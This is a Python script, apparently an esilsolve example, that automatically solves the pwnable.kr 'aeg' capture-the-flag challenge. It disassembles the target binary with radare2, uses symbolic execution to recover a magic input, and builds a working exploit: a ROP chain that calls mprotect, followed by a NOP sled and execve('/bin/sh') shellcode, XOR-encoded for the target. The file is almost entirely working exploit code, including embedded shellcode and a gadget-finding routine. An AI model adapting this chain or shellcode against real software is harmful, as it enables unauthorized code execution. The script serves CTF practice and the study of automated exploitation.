#!/usr/bin/env python
# solve aeg on pwnable.kr with esilsolve
# its faster than manticore and angr
# so thats cool

from esilsolve import ESILSolver
import esilsolve.solver as solver
import r2pipe
from struct import pack, unpack

path = "tests/aeg_program"
r2p = None

def esilsolve_execution(targets):

    esilsolver = ESILSolver(r2p, debug=False, trace=False)
    state = esilsolver.call_state(targets["check_start"])

    buf_len = 48
    b = [solver.BitVec("b%d" % x, 8) for x in range(buf_len)]
    buf = solver.Concat(*b)

    state.memory.write_bv(targets["buf_addr"], buf, buf_len)

    def constrain_jump(instr, newstate):
        # never take jumps for failed solutions
        newstate.solver.add(newstate.registers["zf"] == 1) 

    for jne_addr in targets["jnes"]:
        esilsolver.register_hook(jne_addr, constrain_jump)

    final = esilsolver.run(targets["goal"], avoid=[targets["check_start"]+39])
    
    if final.solver.check() == solver.sat:
        return list(solver.BV2Bytes(final.evaluate(buf)))
    else:
        return []

def generate_exploit(magic, targets):

    addr = targets["buf_addr"]
    last_mov = targets["last_mov"]
    xors = targets["xors"]

    shellcode = b'jhH\xb8/bin///sPj;XH\x89\xe71\xf6\x99\x0f\x05'

    pop_rdi = filter_rop(["pop rdi", "ret"])
    pop_rbp = filter_rop(["pop rbp", "ret"])
    pop_rsi = filter_rop(["pop rsi", "pop r15", "ret"])
    ret = pop_rdi+1
    
    # exploit calls mprotect to make the input executable
    # and then jumps into the shellcode
    exp_str = (
        p64(ret)*90 +
        p64(pop_rbp) +
        p64(addr+48+48+91*8+4) +
        p64(ret)*4 +
        p64(last_mov) + 
        p32(0x7) + p64(0x0) + 
        p64(pop_rdi) + 
        p64(addr & ~(2**12-1)) + 
        p64(pop_rsi) + 
        p64(0x1000) + 
        b"JUNKJUNK" + 
        p64(targets["mprotect"]) + 
        p64(addr+48+48+97*8+32) + 
        b"\x90"*64 + # nop sled
        shellcode
    )

    exp = magic + list(exp_str)
    exploit = ""
    for i in range(len(exp)):
        exploit += "%02x" % (exp[i] ^ (xors[i % 2] & 0xff)) 

    return exploit

def p64(d):
    return pack('<Q', d)

def p32(d):
    return pack('<I', d)

def filter_rop(ops):
    addr = 0
    gadgets = r2p.cmdj("/Rj %s" % ops[0])
    gadgets.reverse()
    for gadget in gadgets:
        instrs = gadget["opcodes"]
        for i, instr in enumerate(instrs):
            rest = [x["opcode"] for x in instrs[i:]]
            if rest == ops:
                addr = instr["offset"]
                break

        if addr != 0:
            break

    return addr

def parse_disassembly():
    r2p.cmd("aa")
    main_instrs = r2p.cmdj("s main; pdfj")

    r2xors = []
    r2start = 0
    r2cmp = 0
    r2buf = 0

    for instr in main_instrs["ops"]:
        if "xor eax" in instr["disasm"]:
            r2xors.append(int(instr["disasm"][9:], 16))
        elif "movzx eax, byte [0x" in instr["disasm"]:
            if r2start == 0:
                r2start = instr["offset"]

            r2buf = int(instr["disasm"].split("[")[1][:-1], 16)

    r2jnes = [x["addr"] for x in r2p.cmdj("/amj jne")]
    r2goal = r2p.cmdj("pdj 1 @ sym.imp.memcpy")[0]["offset"]
    r2mprotect = r2p.cmdj("pdj 1 @ sym.imp.mprotect")[0]["offset"]
    r2movs = [x["addr"] for x in r2p.cmdj("/amj movzx edx, byte") if "- 4" in x["opstr"]]

    last_mov = 0
    for mov in r2movs:
        instrs = r2p.cmdj("pdj 60 @ %d" % mov)[1:]
        good_mov = True

        for instr in instrs:
            if "dx," in instr["disasm"]:
                good_mov = False
                break
            elif "jne" in instr["disasm"]:
                break

        if good_mov:
            last_mov = mov
            break

    r2targets = {
        "check_start": r2start,
        "buf_addr": r2buf,
        "goal": r2goal,
        "xors": r2xors,
        "jnes": r2jnes[:-1],
        "last_mov": last_mov,
        "mprotect": r2mprotect
    }

    return r2targets

if __name__ == "__main__":

    r2p = r2pipe.open(path, flags=["-2"])
    targets = parse_disassembly()
    print("BUFFER ADDR: 0x%016x" % targets["buf_addr"])

    magic = esilsolve_execution(targets)
    print("MAGIC: %s" % magic)

    exploit = generate_exploit(magic, targets)
    print("EXPLOIT: %s" % exploit)